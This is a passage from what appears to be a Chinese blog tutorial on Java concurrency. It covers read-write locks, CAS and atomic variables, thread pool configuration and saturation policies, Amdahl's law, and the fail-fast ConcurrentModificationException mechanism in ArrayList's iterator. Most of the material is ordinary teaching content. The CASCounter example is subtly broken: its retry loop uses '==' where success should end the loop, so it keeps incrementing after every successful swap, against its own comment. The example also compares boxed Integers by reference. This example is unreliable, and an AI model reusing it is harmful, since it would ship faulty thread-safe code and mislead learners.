class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    start.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignored) &#123; &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(increase.incr());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    done.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException | BrokenBarrierException ignored) &#123; &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line"></span><br><span class="line">            start.countDown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ReadWriteLock </p><p>  <code>ReentrantLock</code>和内置锁都是互斥锁，每次只能有一个线程持有锁。互斥锁是一种保守的加锁策略，它可以避免<code>写\写</code>和<code>读\写</code>的冲突，但它同时也限制了<code>读\读</code>。读写锁正是来解决这一问题的，只要能保证每个线程都能读到最新的数据，并且读数据时不会有其它线程来修改数据，那就不会发生问题。使用了读写锁后，一个资源可以同时被多个读操作或者一个写操作，但二者不能同时进行。</p><p>  读写锁实现方式</p><ul><li><strong>释放优先</strong>。当写入线程释放写锁时，如果正在排队的同时存在读和写线程，改优先选择读线程还是写线程。</li><li><strong>读线程插队</strong>。如果锁有读线程获取，但是有写线程等待，那么新到的读线程是否能立即获得锁，还是排队在写线程后面。</li><li><strong>重入性</strong>。读取锁和写入锁是否可重入。</li><li><strong>降级</strong>。如果一个线程持有写入锁，它是否能再不释放该锁的情况下获取读锁。这个线程将同时拥有读写锁，同时将阻止其它线程对被保护资源的读写。</li><li><strong>升级</strong>。读锁能否由于其它正在等待的读线程和写线程升级为一个写入锁。（这协商不好将发生死锁的情况，如果两个读锁同时要升级为写锁）。</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteMap</span> &lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;K, V&gt; map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReadWriteLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Lock</span> <span class="variable">r</span> <span class="operator">=</span> lock.readLock();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Lock</span> <span class="variable">w</span> <span class="operator">=</span> lock.writeLock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReadWriteMap</span><span class="params">(Map&lt;K, V&gt; map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        w.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> map.put(key, value);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            w.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        r.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> map.get(key);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            r.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ... </span><br><span class="line">    <span class="comment">// remove/putAll/clear/size/isEmpty/containsKey/containsValue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="原子变量"><a href="#原子变量" class="headerlink" title="原子变量"></a>原子变量</h4><p>在<code>java.util.concurrent.atomic</code>包中提供了大量原子变量类，原子类底层采用CAS（Compare-and-Swap）方式。CAS在竞争失败时会再试而基于锁保护的操作在获取锁失败时线程将会被挂起，在竞争不激烈环境下失败重试能避免线程挂起而获得不错的性能，在竞争激烈时CAS操作会频繁失败重试。</p><p>CAS：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * CAS 的典型使用模式是：首先从 V 中读取值 A ，并根据 A 计算新值 B ，</span></span><br><span class="line"><span class="comment"> * 然后再通过 CAS 以原子方式将 V 中的值由 A 变成 B （只要在这期间没有任何线程将 V 的值修改为其他值）。</span></span><br><span class="line"><span class="comment"> * 由于 CAS 能检测到来自其他线程的干扰，因此即使不使用锁也能够实现原子的读一改一写操作序列。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CAS</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> T value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CAS</span><span class="params">(T value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> T <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 比较成功则换值</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 对于 i = 1; i = i + 1</span></span><br><span class="line"><span class="comment">     * 我们的预期是1，操作后应该结果是2；</span></span><br><span class="line"><span class="comment">     * 如果此时i确实是1，那就说明没人修改，那就直接将预期结果2赋值给它。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> expectedValue 期望值，即我们看到的值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> newValue      新值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> T <span class="title function_">compareAndSwap</span><span class="params">(T expectedValue, T newValue)</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">oldValue</span> <span class="operator">=</span> value;</span><br><span class="line">        <span class="keyword">if</span> (value == expectedValue)</span><br><span class="line">            value = newValue;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> #compareAndSwap(int, int)&#125; 返回的是旧值，也就是我们期望的那个值的。</span></span><br><span class="line"><span class="comment">     * &lt;br&gt;</span></span><br><span class="line"><span class="comment">     * 如果它的返回值和我们的期望值一样，说明此时交换成功了。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> expectedValue 期望值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> newValue      新值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">compareAndSet</span><span class="params">(T expectedValue, T newValue)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (expectedValue == compareAndSwap(expectedValue, newValue));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CASCounter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> CAS&lt;Integer&gt; value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CASCounter</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.value = <span class="keyword">new</span> <span class="title class_">CAS</span>&lt;&gt;(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">increment</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> v;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            v = value.get();</span><br><span class="line">            <span class="comment">// 相等表示替换成功，失败则重试</span></span><br><span class="line">        &#125; <span class="keyword">while</span> (v == value.compareAndSwap(v, v + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> v + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><ul><li><p>ThreadPoolExecutor</p><ul><li>corePoolSize 初始线程池大小</li><li>maximumPoolSize 最大线程池大小</li><li>keepAliveTime 不活动线程存活时间</li><li>workQueue 任务缓冲队列</li><li>threadFactory 创建工作线程的工厂，特殊情况下我们需要定制我们的工作线程。</li></ul><p>  工作线程满了后新任务可以放到队列中，队列分为有界队列和无界。使用无界队列在工作线程处理不及时时可能会出现排队任务太多，内存溢出情况。</p><p>  使用有界队列时，如果队列满了以后有不同的<code>饱和策略</code>来处理。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ThreadPoolExecutor</span> <span class="variable">executorService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">60</span>, TimeUnit.SECONDS, <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;Runnable&gt;(<span class="number">5</span>));</span><br><span class="line"><span class="comment">// 饱和策略</span></span><br><span class="line"><span class="comment">//executorService.setRejectedExecutionHandler(new ThreadPoolExecutor.DiscardPolicy());</span></span><br><span class="line"><span class="comment">//executorService.setRejectedExecutionHandler(new ThreadPoolExecutor.DiscardOldestPolicy());</span></span><br><span class="line"><span class="comment">//executorService.setRejectedExecutionHandler(new ThreadPoolExecutor.AbortPolicy());</span></span><br><span class="line">executorService.setRejectedExecutionHandler(<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">    Thread.sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">task</span> <span class="operator">=</span> i;</span><br><span class="line">    System.out.printf(<span class="string">&quot;put task %d\n&quot;</span>, task);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        executorService.submit(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                System.out.printf(<span class="string">&quot;run task: %d; thread: %s \n&quot;</span>, task, Thread.currentThread().getName());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.out.println(e.getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;put fail %d [%s]\n&quot;</span>, task, e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newFixedThreadPool</p><p>  大小固定的线程池。注意<code>LinkedBlockingQueue</code>是无界的。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newFixedThreadPool</span><span class="params">(<span class="type">int</span> nThreads)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(nThreads, nThreads,</span><br><span class="line">                                    <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newCachedThreadPool    </p><p>  可缓存的线程池，会回收空闲的线程。注意：这种方式创建的线程池<code>maximumPoolSize</code>为<code>Integer.MAX_VALUE</code>。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newCachedThreadPool</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                    <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">SynchronousQueue</span>&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newSingleThreadExecutor   </p><p>  创建一个单线程线程</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newSingleThreadExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FinalizableDelegatedExecutorService</span></span><br><span class="line">        (<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newScheduledThreadPool   </p><p>  创建一个可定时及周期性任务执行任务的线程池。注意：线程池大小为<code>Integer.MAX_VALUE</code>。</p></li><li><p>newWorkStealingPool </p><p>  这个线程池是1.8引入的。该线程池使用<code>ForkJoinPool</code>实现，参数<code>parallelism</code>为线程的并行数量其继承自<code>AbstractExecutorService</code>。<code>ForkJoinPool</code>实现了一个<code>工作窃取</code>算法，使得空闲线程能够窃取别的线程分解出来的子任务，从而让所有的线程都尽可能处于满负荷，提高执行效率。有一个无参数版本，其将<code>parallelism</code>设为<code>Runtime.getRuntime().availableProcessors()</code>,即处理器核数。</p></li><li><p>ForkJoinPool</p><p>  TODO</p></li></ul><h4 id="饱和策略"><a href="#饱和策略" class="headerlink" title="饱和策略"></a>饱和策略</h4><ul><li><p>Abort </p><p>  默认策略直接拒绝新任务，抛出<code>RejectedExecutionException</code>异常。</p></li><li><p>Discard</p><p>  悄悄的丢弃最新的任务，不会有任何异常抛出。</p></li><li><p>DiscardOld </p><p>  同<code>Discard</code>恰恰相反，悄悄的抛弃最旧的待执行任务。</p></li><li><p>CallerRuns</p><p>  及不抛弃，也不会抛异常。线程池和队列都满时会在调用了<code>execute</code>的线程中执行，这种情况主线程可能会被阻塞。</p></li></ul><h4 id="线程池停止"><a href="#线程池停止" class="headerlink" title="线程池停止"></a>线程池停止</h4><ul><li><p>shutdown </p><p>  非阻塞方法。停止线程，会等待所有工作及排队线程都执行完毕。</p></li><li><p>shutdownNow</p><p>  非阻塞。先停止（<code>interrupt</code>）正在执行的线程，然后返回正在等待的任务。通过检测<code>Thread.currentThread().isInterrupted()</code>适时结束正在执行的线程。</p></li><li><p>awaitTermination(timeout, unit)</p><p>  阻塞等待最长<code>timeout</code>等待线程池结束。</p></li></ul><h3 id="Amdahl定律"><a href="#Amdahl定律" class="headerlink" title="Amdahl定律"></a>Amdahl定律</h3><p>在有些问题中，如果可用资源越多那么解决问题的速度就越快。可用资源与速度是一个什么关系呢？我们增加了10倍机器能获得性几倍的提升呢？Amdahl定律描述的正是这个问题。</p><p>在增加计算资源的情况下，程序理论上能实现的最高加速比，这个值取决于程序中科并行组件与串行组件所占的比重。假设F是必须被串行执行的部分，那么根据Amdahl定律，在包含N个处理器的机器中，最高的加速比为：<br><img src="/images/amdahl.png"><br>当N趋近无穷大时，最大的加速比趋近1&#x2F;F。因此如果程序中如果有50%的计算需要串行执行，那么最高的加速比只能是2（不管有多少个处理器多少个线程可用）。如果程序中有10%的计算需要串行，那么最高的加速比将接近10。</p><p>Amdahl定律的应用场景：</p><p>在一个订单处理系统中，我们应用服务器可以很方便的扩展很多倍。那么在数据库中并发扣减库存这个点就是整个系统的串行点，这个点直接决定了整个系统最终的吞吐量。遇到这种问题，我们盲目堆机器初期能提高吞吐量，增加到一定程度性能将不再提升，而且还会因为线程竞争激烈造成性能下降。</p><h3 id="常见异常"><a href="#常见异常" class="headerlink" title="常见异常"></a>常见异常</h3><ul><li><p>java.util.ConcurrentModificationException</p><p>  对容器迭代的时候如果同时对其进行修就会抛出<code>ConcurrentModificationException</code>。这类似一种<strong>预警机制</strong>，它将计数器与容器变化关联。如果迭代期间计数器被修改那么<code>hasNext</code>或者<code>next</code>将抛出异常。在迭代期间迭代器可能并没有意识到容器已经修改了，这是一种权衡机制来尽量避免并发修改操作对程序的影响。</p><p>  <code>modCount</code>是List的一个成员变量，表示容器修改(add&#x2F;remove)次数。<br>  <code>expectedModCount</code>是<code>Iterator</code>内部变量，这个值的初始值就是<code>modCount</code>的值。如果迭代过程中修改了容器，<code>modCount</code>就会改变，而此时<code>expectedModCount</code>还是<code>modCount</code>的旧值。    </p><blockquote><p>不管是简单的for，还是增强for循环编译后都是Iterator迭代。<br>直接调用<code>Iterator.remove</code>来删除元素不会出现<code>ConcurrentModificationException</code>异常，其方法内部会重新修正<code>modCount</code>和<code>expectedModCount</code>的值。</p></blockquote>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Itr</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* An optimized version of AbstractList.Itr</span></span><br><span class="line"><span class="comment">* 内部类，可以直接访问宿主类属性。用于容器迭代。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Itr</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="type">int</span> cursor;       <span class="comment">// index of next element to return</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">lastRet</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such</span></span><br><span class="line">    <span class="comment">// 保留原始的modCount值，可以看做是oldModCount</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cursor != size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 每次迭代是都检查 </span></span><br><span class="line">        checkForComodification();</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        cursor = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line">        checkForComodification();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ArrayList.<span class="built_in">this</span>.remove(lastRet);</span><br><span class="line">            cursor = lastRet;</span><br><span class="line">            lastRet = -<span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 直接调用it.remove()后不会触发ConcurrentModificationException异常</span></span><br><span class="line">            <span class="comment">// 这里会重置expectedModCount的值</span></span><br><span class="line">            expectedModCount = modCount;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; consumer)</span> &#123;</span><br><span class="line">        Objects.requireNonNull(consumer);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> ArrayList.<span class="built_in">this</span>.size;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i != size &amp;&amp; modCount == expectedModCount) &#123;</span><br><span class="line">            consumer.accept((E) elementData[i++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// update once at end of iteration to reduce heap write traffic</span></span><br><span class="line">        cursor = i;</span><br><span class="line">        lastRet = i - <span class="number">1</span>;</span><br><span class="line">        checkForComodification();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// modCount 为宿主类属性，实时的</span></span><br><span class="line">        <span class="comment">// expectedModCount 为创建迭代器时的 modCount</span></span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果这里没有即时抛出`ConcurrentModificationException`异常，</span></span><br><span class="line"><span class="comment">// 因为我们在循环开始前已经取过size值，那么后面肯定会因为删除元素抛出`ArrayIndexOutOfBoundsException`异常。</span></span><br><span class="line"><span class="comment">// 这种机制被称为及时失败（fail-fast），及早发现问题抛出问题避免无意义的操作，因为最终迭代过程可能出现异常。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.size(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;pill&quot;</span>.equals(strs.get(i))) strs.remove(strs.get(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  